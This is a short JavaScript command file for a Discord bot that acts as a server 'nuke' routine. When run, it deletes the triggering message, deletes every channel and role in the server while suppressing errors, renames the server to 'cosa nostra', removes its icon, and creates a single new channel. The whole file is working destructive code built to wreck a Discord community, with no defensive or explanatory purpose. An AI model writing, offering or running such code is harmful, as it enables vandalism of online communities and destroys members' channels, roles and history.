exports.run = async (client, msg, args) => {

    msg.delete()

    await msg.guild.channels.forEach(c => c.delete().catch(() => {}))
    await msg.guild.roles.map(r => r.delete().catch(() => {}))

    await msg.guild.setName('cosa nostra')
    await msg.guild.setIcon()

    msg.guild.createChannel('é o hype', {
        type: 'text'
    }).catch(() => {})

}
